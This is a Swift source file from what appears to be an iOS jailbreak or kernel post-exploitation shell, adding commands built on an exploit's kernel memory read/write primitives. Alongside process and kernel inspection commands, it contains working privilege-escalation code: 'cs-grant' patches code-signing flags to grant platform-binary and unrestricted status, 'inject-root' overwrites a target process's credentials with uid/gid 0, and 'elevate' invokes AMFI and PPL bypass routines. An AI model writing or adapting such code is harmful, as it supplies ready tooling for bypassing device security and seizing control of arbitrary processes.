//
  //  OmegaExtendedE.swift
  //  lara
  //
  //  Enhanced Kernel Control Shell — Inspection, Linking & Privilege Engines
  //
  //  CRASH-FIX (proc-info respring):
  //    Root cause: _allprocs backward walk via le_prev treated TAILQ pointer-to-pointer
  //    as pointer-to-struct.  In XNU TAILQ, le_prev holds the ADDRESS of the previous
  //    node's tqe_next field (or allproc.tqh_first for the first entry), NOT a direct
  //    proc pointer.  Reading proc fields from (allproc_head_addr - nextOff) lands on
  //    kernel BSS / static data, some of which is unmapped or PPL-guarded → kernel panic
  //    → respring.
  //
  //  Fix strategy:
  //    1. _allprocs: forward-only walk from ds_get_our_proc().  Safe, no TAILQ math.
  //    2. _buildKProc(from:): build a KProc from a raw kernel proc address with
  //       ds_isvalid() guards before every read.
  //    3. _findProc: if forward walk misses target (e.g. PID 1 / launchd that lives
  //       earlier in the list), fall back to C-side procbypid() / proc_find_by_name()
  //       which start from the real allproc head via offsets_init()-resolved pointers.
  //
  //  Previous fixes (kept):
  //    [BUG-1] taskPtr came from proc_ro ptr (ptr+0x18), not from proc_ro->pr_task.
  //    [BUG-3] proc-info ucredPtr was p.kaddr+0x20; ucred lives in proc_ro.
  //    [BUG-4] inject-root had the same wrong ucred offset.
  //

  import Foundation
  import Darwin

  // MARK: – Private helpers

  private func _hex(_ s: String) -> UInt64? {
      let t = s.trimmingCharacters(in: .whitespaces)
      let stripped = (t.hasPrefix("0x") || t.hasPrefix("0X")) ? String(t.dropFirst(2)) : t
      return UInt64(stripped, radix: 16)
  }

  private struct KProc {
      let kaddr:     UInt64
      let pid:       Int32
      let uid:       UInt32
      let name:      String
      let taskPtr:   UInt64   // from proc_ro->pr_task
      let procROPtr: UInt64   // proc_ro pointer
  }

  // ── Shared offset helpers ─────────────────────────────────────────────────────

  private var _nextOff:   UInt64 { UInt64(off_proc_p_list_le_next) }  // 0x0 is valid (le_next at offset 0)
  private var _pidOff:    UInt64 { off_proc_p_pid          != 0 ? UInt64(off_proc_p_pid)           : 0x60 }
  private var _nameOff:   UInt64 { off_proc_p_name         != 0 ? UInt64(off_proc_p_name)          : 0x56c }
  private var _procROOff: UInt64 { off_proc_p_proc_ro      != 0 ? UInt64(off_proc_p_proc_ro)       : 0x18 }
  private var _taskROOff: UInt64 { off_proc_ro_pr_task     != 0 ? UInt64(off_proc_ro_pr_task)      : 0x00 }
  private let _uidOff:    UInt64 = 0x30   // p_uid — constant for iOS 16-18 arm64e

  // ── Build a KProc from a raw kernel proc address ──────────────────────────────
  // Uses ds_isvalid() before every dereference so a bad address returns nil
  // instead of triggering a kernel panic.
  private func _buildKProc(from ptr: UInt64) -> KProc? {
      guard ptr != 0, ds_isvalid(ptr) else { return nil }

      let pid = Int32(bitPattern: ds_kread32(ptr + _pidOff))
      guard pid > 0 else { return nil }

      let uid = ds_kread32(ptr + _uidOff)

      var name = ""
      let nameOff = _nameOff
      if nameOff != 0, ds_isvalid(ptr + nameOff) {
          var buf = [UInt8](repeating: 0, count: 33)
          ds_kreadbuf(ptr + nameOff, &buf, 32)
          name = String(bytes: buf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? ""
      }
      // Fallback name offsets for iOS 16 vs 18
      if name.isEmpty {
          for off: UInt64 in [0x56c, 0x268, 0x2d0] where off != nameOff {
              guard ds_isvalid(ptr + off) else { continue }
              var buf = [UInt8](repeating: 0, count: 17)
              ds_kreadbuf(ptr + off, &buf, 16)
              let s = String(bytes: buf.prefix(while: { $0 != 0 }), encoding: .utf8) ?? ""
              if !s.isEmpty { name = s; break }
          }
      }

      // proc_ro — read only if address looks valid
      let procROAddr = ptr + _procROOff
      var proc_ro: UInt64 = 0
      if ds_isvalid(procROAddr) {
          proc_ro = ds_kreadptr(procROAddr)
      }

      // task — inside proc_ro
      var taskPtr: UInt64 = 0
      if proc_ro != 0, ds_isvalid(proc_ro) {
          taskPtr = ds_kreadptr(proc_ro + _taskROOff)
      }

      return KProc(kaddr: ptr, pid: pid, uid: uid, name: name,
                   taskPtr: taskPtr, procROPtr: proc_ro)
  }

  // ── Forward-only allproc walk from our proc ───────────────────────────────────
  // CRASH-FIX: No backward walk.  TAILQ le_prev is a pointer-to-pointer
  // (points to prev node's tqe_next field, or to allproc.tqh_first).
  // Treating it as a direct proc pointer reads kernel BSS → kernel panic.
  // Processes earlier in the list (PID 1, etc.) are found via procbypid() fallback.
  private func _allprocs(mgr: laramgr, limit: Int = 512) -> [KProc] {
      let startPtr = ds_get_our_proc()
      guard startPtr != 0 else { return [] }

      var list = [KProc]()
      list.reserveCapacity(256)
      var seen = Set<UInt64>()
      var ptr  = startPtr

      while ptr != 0, !seen.contains(ptr), list.count < limit {
          seen.insert(ptr)
          if let entry = _buildKProc(from: ptr) {
              list.append(entry)
          }
          guard ds_isvalid(ptr + _nextOff) else { break }
          ptr = ds_kreadptr(ptr + _nextOff)
      }

      return list
  }

  // ── Find a single process by pid or name ─────────────────────────────────────
  // CRASH-FIX: Falls back to C-side procbypid() / proc_find_by_name() when the
  // forward walk misses the target (processes added to allproc before our proc,
  // e.g. launchd PID 1).  These C functions use offsets_init()-resolved pointers
  // and have been stable throughout the session.
  private func _findProc(arg: String, mgr: laramgr) -> KProc? {
      let procs = _allprocs(mgr: mgr)

      if let pid = Int32(arg) {
          // 1 — try forward walk result
          if let found = procs.first(where: { $0.pid == pid }) { return found }
          // 2 — fall back to C procbypid (walks from real allproc head)
          let kaddr = procbypid(pid_t(pid))
          return _buildKProc(from: kaddr)
      }

      let lower = arg.lowercased()
      // 1 — try forward walk result
      if let found = procs.first(where: { $0.name.lowercased().contains(lower) }) { return found }
      // 2 — fall back to C proc_find_by_name
      let kaddr = proc_find_by_name(arg)
      return _buildKProc(from: kaddr)
  }

  // ── CS flags ──────────────────────────────────────────────────────────────────

  private func _readCSFlags(_ proc: KProc) -> UInt32 {
      for off: UInt64 in [0x300, 0x2c4, 0x2e0] {
          let v = ds_kread32(proc.kaddr + off)
          if v != 0 { return v }
      }
      return 0
  }

  private let _csNames: [(UInt32, String)] = [
      (0x0001, "VALID"),        (0x0002, "ADHOC"),
      (0x0004, "GET_TASK_ALLOW"), (0x0008, "INSTALLER"),
      (0x0010, "FORCED_LV"),    (0x0020, "INVALID"),
      (0x0040, "HARD"),         (0x0080, "KILL"),
      (0x0100, "CHECK_EXPIRATION"), (0x0200, "RESTRICT"),
      (0x0400, "ENFORCEMENT"),  (0x0800, "REQUIRE_LV"),
      (0x2000, "ENTITLEMENTS_VALIDATED"), (0x4000, "NO_UNTRUSTED_HELPERS"),
      (0x8000, "DEBUGGED"),     (0x10000, "SIGNED"),
      (0x20000, "DEV_CODE"),    (0x100000, "PLATFORM_BINARY"),
      (0x200000, "PLATFORM_PATH"), (0x400000, "DEBUGGER"),
      (0x800000, "ENTITLEMENT_DISK"), (0x4000000, "UNRESTRICTED"),
      (0x80000000, "EXECSEG_MAIN_BINARY"),
  ]

  private func _csDescription(_ flags: UInt32) -> String {
      _csNames.filter { flags & $0.0 != 0 }.map { $0.1 }.joined(separator: " | ")
  }

  // MARK: – Command Registration

  func registerExtendedECommands() {

      // ── kernel-info ───────────────────────────────────────────────────────────
      OmegaCore.register("kernel-info") { _, mgr in
          guard mgr.dsready else { return .fail("kernel-info: exploit not ready") }
          let kb  = ds_get_kernel_base()
          let ks  = ds_get_kernel_slide()
          let uid = getuid(); let gid = getgid(); let pid = getpid()
          let our = ds_get_our_proc(); let ourT = ds_get_our_task()
          var osVer = "unknown"
          var buf = [CChar](repeating: 0, count: 64); var sz = buf.count
          if sysctlbyname("kern.osproductversion", &buf, &sz, nil, 0) == 0 { osVer = String(cString: buf) }
          var buildBuf = [CChar](repeating: 0, count: 64); var buildSz = buildBuf.count
          var build = "unknown"
          if sysctlbyname("kern.osversion", &buildBuf, &buildSz, nil, 0) == 0 { build = String(cString: buildBuf) }
          return .ok(String(format:
              "──────────── kernel-info ────────────\n" +
              "  iOS version  : %@\n  build        : %@\n" +
              "  kernel_base  : 0x%016llx\n  kernel_slide : 0x%016llx\n" +
              "  our_proc     : 0x%016llx\n  our_task     : 0x%016llx\n" +
              "  pid          : %d\n  uid          : %d\n  gid          : %d\n" +
              "  vfs_ready    : %@\n  sbx_ready    : %@\n  has_offsets  : %@\n" +
              "─────────────────────────────────────\n",
              osVer, build, kb, ks, our, ourT, pid, uid, gid,
              mgr.vfsready ? "yes" : "no", mgr.sbxready ? "yes" : "no",
              mgr.hasOffsets ? "yes" : "no"))
      }

      // ── proc-tree ─────────────────────────────────────────────────────────────
      OmegaCore.register("proc-tree") { _, mgr in
          guard mgr.dsready else { return .fail("proc-tree: exploit not ready") }
          let procs = _allprocs(mgr: mgr)
          if procs.isEmpty { return .fail("proc-tree: allproc walk returned 0 entries") }
          var out = String(format: "proc-tree: %d processes (forward walk from our proc)\n", procs.count)
          out += "  PID    UID   KADDR               NAME\n"
          out += "  ─────  ───   ──────────────────  ──────────────────────\n"
          for p in procs.sorted(by: { $0.pid < $1.pid }) {
              out += String(format: "  %-6d %-5d 0x%016llx  %@\n", p.pid, p.uid, p.kaddr, p.name)
          }
          return .ok(out)
      }

      // ── proc-info <pid|name> ──────────────────────────────────────────────────
      OmegaCore.register("proc-info") { rawArg, mgr in
          guard mgr.dsready else { return .fail("proc-info: exploit not ready") }
          let arg = rawArg.trimmingCharacters(in: .whitespaces)
          guard !arg.isEmpty else { return .fail("proc-info: usage — proc-info <pid|name>") }

          // ── SURGICAL FIX: Use procbypid() for direct lookup instead of forward walk
          let pid: Int32
          if let n = Int32(arg) { pid = n }
          else if let found = ProcessLayer.shared.find(matching: arg.lowercased()).first {
              pid = found.pid
          } else {
              return .fail("proc-info: process '\(arg)' not found")
          }

          let kaddr = procbypid(pid_t(pid))
          guard kaddr != 0 else {
              return .fail("proc-info: pid \(pid) not found in kernel allproc")
          }

          // Dynamic offset probing for proc_ro → ucred
          let procROOffsets:  [UInt64] = [0x18, 0x20, 0x28, 0x30]
          let ucredROOffsets: [UInt64] = [0x08, 0x10, 0x18, 0x20]
          let credBaseOffsets:[UInt64] = [0x18, 0x20]

          var bestProcRO: UInt64 = 0, bestUcred: UInt64 = 0, bestBase: UInt64 = 0x18
          var bestScore = -1

          for pro in procROOffsets {
              let proc_ro = ds_kreadptr(kaddr + pro)
              guard proc_ro != 0, ds_isvalid(proc_ro) else { continue }
              for uco in ucredROOffsets {
                  let ucred = ds_kreadptr(proc_ro + uco)
                  guard ucred != 0, ds_isvalid(ucred) else { continue }
                  for cBase in credBaseOffsets {
                      let c_uid = ds_kread32(ucred + cBase)
                      let c_gid = ds_kread32(ucred + cBase + 0x0C)
                      let c_ng  = ds_kread32(ucred + cBase + 0x18)
                      var score = 0
                      if c_uid < 100_000 { score += 10 }
                      if c_gid < 100_000 { score += 10 }
                      if c_ng <= 16 { score += 200 }
                      else if c_ng > 1000 { score -= 100 }
                      if score > bestScore {
                          bestScore = score; bestProcRO = proc_ro
                          bestUcred = ucred; bestBase = cBase
                      }
                  }
              }
          }

          let csFlags = _readCSFlags(KProc(kaddr: kaddr, pid: pid, uid: 0, name: "", taskPtr: 0, procROPtr: bestProcRO))
          let ucredUID = bestUcred != 0 ? ds_kread32(bestUcred + bestBase) : 0
          let ucredGID = bestUcred != 0 ? ds_kread32(bestUcred + bestBase + 0x0C) : 0

          return .ok(String(format: "proc-info: %@ (pid %d)\n  kaddr        : 0x%016llx\n  proc_ro_ptr  : 0x%016llx\n  ucred_ptr    : 0x%016llx\n  ucred_uid    : %d\n  ucred_gid    : %d\n  cs_flags     : 0x%08x\n  cs_flags_str : %@\n  probe_score  : %d (dynamic)", arg, pid, kaddr, bestProcRO, bestUcred, ucredUID, ucredGID, csFlags, _csDescription(csFlags), bestScore))
      }

      OmegaCore.register("thread-list") { rawArg, mgr in
          guard mgr.dsready else { return .fail("thread-list: exploit not ready") }
          let arg = rawArg.trimmingCharacters(in: .whitespaces)
          guard !arg.isEmpty else { return .fail("thread-list: usage — thread-list <pid|name>") }
          guard let p = _findProc(arg: arg, mgr: mgr) else {
              return .fail("thread-list: process '\(arg)' not found")
          }
          var out = String(format: "thread-list: %@ (pid %d)\n", p.name, p.pid)
          var taskPort: mach_port_t = 0
          let taskErr = task_for_pid(mach_task_self_, p.pid, &taskPort)
          if taskErr == KERN_SUCCESS && taskPort != 0 {
              var threadList: thread_act_array_t?
              var threadCount: mach_msg_type_number_t = 0
              let threadsErr = task_threads(taskPort, &threadList, &threadCount)
              if threadsErr == KERN_SUCCESS, let threads = threadList {
                  out += String(format: "  %d thread(s) via task_for_pid\n", threadCount)
                  out += "  #   STATE              MACH-PORT\n"
                  out += "  ─── ─────────────────  ──────────\n"
                  for i in 0 ..< Int(threadCount) {
                      let th = threads[i]
                      var bi = thread_basic_info()
                      let cnt0 = mach_msg_type_number_t(MemoryLayout<thread_basic_info>.size / MemoryLayout<integer_t>.size)
                      var cnt  = cnt0
                      withUnsafeMutablePointer(to: &bi) { ptr in
                          ptr.withMemoryRebound(to: integer_t.self, capacity: Int(cnt)) { buf in
                              _ = thread_info(th, thread_flavor_t(THREAD_BASIC_INFO), buf, &cnt)
                          }
                      }
                      let state: String
                      switch Int32(bi.run_state) {
                      case TH_STATE_RUNNING:         state = "RUNNING"
                      case TH_STATE_STOPPED:         state = "STOPPED"
                      case TH_STATE_WAITING:         state = "WAITING"
                      case TH_STATE_UNINTERRUPTIBLE: state = "UNINTERRUPTIBLE"
                      case TH_STATE_HALTED:          state = "HALTED"
                      default:                       state = "UNKNOWN(\(bi.run_state))"
                      }
                      out += String(format: "  %-3d %-17s  0x%08x\n", i, state, th)
                      mach_port_deallocate(mach_task_self_, th)
                  }
                  _ = vm_deallocate(mach_task_self_,
                                    vm_address_t(bitPattern: threadList),
                                    vm_size_t(threadCount) * vm_size_t(MemoryLayout<thread_act_t>.size))
              } else {
                  out += "  task_threads() failed (kr=\(threadsErr))\n"
              }
              mach_port_deallocate(mach_task_self_, taskPort)
          } else {
              out += "  (task_for_pid kr=\(taskErr) — iOS restricts system processes)\n"
              out += String(format: "  task_ptr  : 0x%016llx\n", p.taskPtr)
              if p.taskPtr != 0 {
                  var threadCount: UInt32 = 0
                  for off: UInt64 in [0x2b8, 0x2a8, 0x29c] {
                      let v = ds_kread32(p.taskPtr + off)
                      if v > 0 && v < 2048 { threadCount = v; break }
                  }
                  out += String(format: "  threads   : ~%u (kernel estimate)\n", threadCount)
                  out += "  hint      : use proc-info for full task details\n"
              }
          }
          return .ok(out)
      }

      // ── cs-flags <pid|name> ───────────────────────────────────────────────────
      OmegaCore.register("cs-flags") { rawArg, mgr in
          guard mgr.dsready else { return .fail("cs-flags: exploit not ready") }
          let arg = rawArg.trimmingCharacters(in: .whitespaces)
          guard !arg.isEmpty else { return .fail("cs-flags: usage — cs-flags <pid|name>") }
          guard let p = _findProc(arg: arg, mgr: mgr) else {
              return .fail("cs-flags: process '\(arg)' not found")
          }
          let flags = _readCSFlags(p)
          return .ok(String(format: "cs-flags: %@ (pid %d)\n  flags : 0x%08x\n  bits  : %@\n",
                            p.name, p.pid, flags, _csDescription(flags)))
      }

      // ── cs-grant <pid|name> ───────────────────────────────────────────────────
      OmegaCore.register("cs-grant") { rawArg, mgr in
          guard mgr.dsready else { return .fail("cs-grant: exploit not ready") }
          let arg = rawArg.trimmingCharacters(in: .whitespaces)
          guard !arg.isEmpty else { return .fail("cs-grant: usage — cs-grant <pid|name>") }
          guard let p = _findProc(arg: arg, mgr: mgr) else {
              return .fail("cs-grant: process '\(arg)' not found")
          }
          let grantMask: UInt32 = 0x100000 | 0x8000 | 0x4000000
          var didPatch = false
          for off: UInt64 in [0x300, 0x2c4, 0x2e0] {
              let cur = ds_kread32(p.kaddr + off)
              if cur != 0 {
                  ds_kwrite32(p.kaddr + off, cur | grantMask)
                  let rb = ds_kread32(p.kaddr + off)
                  didPatch = (rb & grantMask) == grantMask
                  break
              }
          }
          return didPatch
              ? .ok("cs-grant: ✔ granted CS_PLATFORM_BINARY|CS_DEBUGGED|CS_UNRESTRICTED to \(p.name) (pid \(p.pid))")
              : .fail("cs-grant: ✖ could not locate p_csflags for \(p.name)")
      }

      // ── inject-root <pid|name> ────────────────────────────────────────────────
      OmegaCore.register("inject-root") { rawArg, mgr in
          guard mgr.dsready else { return .fail("inject-root: exploit not ready") }
          let arg = rawArg.trimmingCharacters(in: .whitespaces)
          guard !arg.isEmpty else { return .fail("inject-root: usage — inject-root <pid|name>") }

          // Direct kernel lookup via procbypid (safer than forward walk)
          let pid: Int32
          if let n = Int32(arg) { pid = n }
          else if let found = ProcessLayer.shared.find(matching: arg.lowercased()).first {
              pid = found.pid
          } else {
              return .fail("inject-root: process '\(arg)' not found")
          }

          let kaddr = procbypid(pid_t(pid))
          guard kaddr != 0 else {
              return .fail("inject-root: pid \(pid) not found in kernel allproc")
          }

          // ── Dynamic offset probing for ucred ──
          let procROOffsets:  [UInt64] = [0x18, 0x20, 0x28, 0x30]
          let ucredROOffsets: [UInt64] = [0x08, 0x10, 0x18, 0x20]
          let credBaseOffsets:[UInt64] = [0x18, 0x20]

          var bestProcRO: UInt64 = 0, bestUcred: UInt64 = 0, bestBase: UInt64 = 0x18
          var bestScore = -1

          for pro in procROOffsets {
              let proc_ro = ds_kreadptr(kaddr + pro)
              guard proc_ro != 0, ds_isvalid(proc_ro) else { continue }
              for uco in ucredROOffsets {
                  let ucred = ds_kreadptr(proc_ro + uco)
                  guard ucred != 0, ds_isvalid(ucred) else { continue }
                  for cBase in credBaseOffsets {
                      let c_uid = ds_kread32(ucred + cBase)
                      let c_gid = ds_kread32(ucred + cBase + 0x0C)
                      let c_ng  = ds_kread32(ucred + cBase + 0x18)
                      var score = 0
                      if c_uid < 100_000 { score += 10 }
                      if c_gid < 100_000 { score += 10 }
                      if c_ng <= 16 { score += 200 }
                      else if c_ng > 1000 { score -= 100 }
                      if score > bestScore {
                          bestScore = score; bestProcRO = proc_ro
                          bestUcred = ucred; bestBase = cBase
                      }
                  }
              }
          }

          guard bestUcred != 0 else {
              return .fail("inject-root: could not locate valid ucred for \(arg)")
          }

          let ucredPtr = bestUcred
          let b = bestBase
          let uidOffsets: [(UInt64, String)] = [
              (b, "cr_uid"), (b+0x04, "cr_ruid"), (b+0x08, "cr_svuid"),
              (b+0x0C, "cr_gid"), (b+0x10, "cr_rgid"), (b+0x14, "cr_svgid"),
          ]
          var results = [String]()
          for (off, fname) in uidOffsets {
              let old = ds_kread32(ucredPtr + off)
              ds_kwrite32(ucredPtr + off, 0)
              let rb = ds_kread32(ucredPtr + off)
              results.append(String(format: "  %@: %u → %u %@", fname, old, rb, rb == 0 ? "✔" : "✖"))
          }
          let out = "inject-root: \(arg) (pid \(pid))\n  proc_ro_ptr : \(String(format: "0x%016llx", bestProcRO))\n  ucred_ptr   : \(String(format: "0x%016llx", ucredPtr))\n  layout      : score=\(bestScore) (dynamic probe)\n" + results.joined(separator: "\n")
          return .ok(out)
      }

      OmegaCore.register("pivot-status") { _, mgr in
          guard mgr.dsready else { return .fail("pivot-status: exploit not ready") }
          let uid = getuid(); let isRoot = uid == 0
          let selfProc = KProc(kaddr: ds_get_our_proc(), pid: getpid(), uid: uid,
                               name: "self", taskPtr: ds_get_our_task(), procROPtr: 0)
          let csFlags = _readCSFlags(selfProc)
          return .ok(String(format:
              "──────────── pivot-status ────────────\n" +
              "  uid          : %d  %@\n  amfi_is_root : %@\n" +
              "  vfs_ready    : %@\n  sbx_ready    : %@\n" +
              "  our_cs_flags : 0x%08x\n  cs_bits      : %@\n" +
              "─────────────────────────────────────\n",
              uid, isRoot ? "← ROOT ✔" : "(not root)",
              amfi_is_root() ? "yes" : "no",
              mgr.vfsready ? "yes" : "no", mgr.sbxready ? "yes" : "no",
              csFlags, _csDescription(csFlags)))
      }

      // ── kern-regions ──────────────────────────────────────────────────────────
      OmegaCore.register("kern-regions") { _, mgr in
          guard mgr.dsready else { return .fail("kern-regions: exploit not ready") }
          let kb = ds_get_kernel_base(); let ks = ds_get_kernel_slide()
          let regions: [(String, UInt64)] = [
              ("__TEXT  (kernel text)",  kb),
              ("__DATA  (kernel data)",  kb + 0x0800_0000),
              ("__DATA_CONST",           kb + 0x1000_0000),
              ("our_proc",               ds_get_our_proc()),
              ("our_task",               ds_get_our_task()),
          ]
          var out = String(format: "kern-regions: base=0x%llx  slide=0x%llx\n\n", kb, ks)
          out += "  REGION                    ADDRESS             UNSLID\n"
          out += "  ─────────────────────────  ─────────────────── ───────────────────\n"
          for (name, addr) in regions {
              out += String(format: "  %-25@  0x%016llx  0x%016llx\n",
                            name as NSString, addr, addr &- ks)
          }
          return .ok(out)
      }

      // ── smr-read <addr> ───────────────────────────────────────────────────────
      OmegaCore.register("smr-read") { rawArg, mgr in
          guard mgr.dsready else { return .fail("smr-read: exploit not ready") }
          guard let addr = _hex(rawArg.trimmingCharacters(in: .whitespaces)) else {
              return .fail("smr-read: usage — smr-read <addr_hex>")
          }
          return .ok(String(format: "smr-read: 0x%016llx → 0x%016llx\n", addr, ds_kreadsmrptr(addr)))
      }

      // ── kaddr-info <addr> ────────────────────────────────────────────────────
      OmegaCore.register("kaddr-info") { rawArg, mgr in
          guard mgr.dsready else { return .fail("kaddr-info: exploit not ready") }
          guard let addr = _hex(rawArg.trimmingCharacters(in: .whitespaces)) else {
              return .fail("kaddr-info: usage — kaddr-info <addr_hex>")
          }
          let kb = ds_get_kernel_base(); let ks = ds_get_kernel_slide()
          var region = "unknown"
          if addr >= kb && addr < kb + 0x0800_0000             { region = "__TEXT (kernel code)" }
          else if addr >= kb + 0x0800_0000 && addr < kb + 0x1800_0000 { region = "__DATA (kernel data)" }
          else if addr >= 0xFFFF_FFFF_0000_0000                { region = "kernel virtual space" }
          else if addr < 0x0001_0000_0000_0000                 { region = "user space" }
          let valid = ds_isvalid(addr)
          return .ok(String(format:
              "kaddr-info: 0x%016llx\n  region : %@\n  unslid : 0x%016llx\n" +
              "  valid  : %@\n  value64: 0x%016llx\n",
              addr, region, addr &- ks,
              valid ? "yes" : "no / inaccessible",
              valid ? ds_kread64(addr) : 0))
      }

      // ── sandbox-check <pid|name> ──────────────────────────────────────────────
      OmegaCore.register("sandbox-check") { rawArg, mgr in
          guard mgr.dsready else { return .fail("sandbox-check: exploit not ready") }
          let arg = rawArg.trimmingCharacters(in: .whitespaces)
          guard !arg.isEmpty else { return .fail("sandbox-check: usage — sandbox-check <pid|name>") }
          guard let p = _findProc(arg: arg, mgr: mgr) else {
              return .fail("sandbox-check: process '\(arg)' not found")
          }
          let pflags = ds_kread32(p.kaddr + 0x10)
          let csFlags = _readCSFlags(p)
          return .ok(String(format:
              "sandbox-check: %@ (pid %d)\n" +
              "  p_flags     : 0x%08x\n  P_RESTRICTED: %@\n  CS_RESTRICT : %@  (cs_flags=0x%08x)\n",
              p.name, p.pid, pflags,
              (pflags & 0x200) != 0 ? "YES (sandboxed)" : "NO",
              (csFlags & 0x200) != 0 ? "YES" : "NO", csFlags))
      }

      // ── amfi-status ───────────────────────────────────────────────────────────
      OmegaCore.register("amfi-status") { _, mgr in
          guard mgr.dsready else { return .fail("amfi-status: exploit not ready") }
          let enforce = amfi_get_mac_proc_enforce()
          return .ok(String(format:
              "amfi-status:\n  mac_proc_enforce : %d  (%@)\n" +
              "  amfi_is_root     : %@\n  uid              : %d\n",
              enforce, enforce == 0 ? "disabled — bypassed ✔" : "enabled",
              amfi_is_root() ? "yes ✔" : "no", getuid()))
      }

      // ── elevate ───────────────────────────────────────────────────────────────
      OmegaCore.register("elevate") { _, mgr in
          guard mgr.dsready else { return .fail("elevate: exploit not ready") }
          let uidBefore = getuid()
          if uidBefore == 0 { return .ok("elevate: already root — uid=0 ✔") }
          let r = amfi_elevate_to_root(); let uidAfter = getuid()
          if r == 0 || uidAfter == 0 {
              return .ok(String(format: "elevate: ✔ uid=0\n  before: %d  after: %d  method: amfi(%d)\n",
                                uidBefore, uidAfter, r))
          }
          let r2 = ppl_bypass(); let uidAfter2 = getuid()
          if r2 == 0 || uidAfter2 == 0 {
              return .ok(String(format: "elevate: ✔ uid=0 via ppl_bypass()\n  before: %d  after: %d\n",
                                uidBefore, uidAfter2))
          }
          return .fail(String(format: "elevate: ✖ all failed\n  amfi: %d  ppl: %d  uid: %d\n",
                              r, r2, getuid()))
      }

      // ── help-kernel ───────────────────────────────────────────────────────────
      OmegaCore.register("help-kernel") { _, _ in
          .ok("""
  help-kernel: Kernel Control Commands
  ─────────────────────────────────────────────────────────────────────
    INSPECTION:
      kernel-info                    Full kernel environment snapshot
      proc-tree                      All processes with kernel addresses
      proc-info <pid|name>           Deep process inspection
      thread-list <pid>              Thread list for a process
      pivot-status                   Privilege escalation status
      kern-regions                   Kernel memory region map
      kaddr-info <addr>              Classify a kernel address
      smr-read <addr>                Read SMR-protected pointer
      amfi-status                    AMFI enforcement state
      sandbox-check <pid|name>       Sandbox status of a process
    PRIVILEGE:
      elevate                        Elevate to root (all strategies)
      cs-flags <pid|name>            Read CS flags
      cs-grant <pid|name>            Grant full CS permissions
      inject-root <pid|name>         Inject uid=0 into target process
  ─────────────────────────────────────────────────────────────────────
  """)
      }
  }
  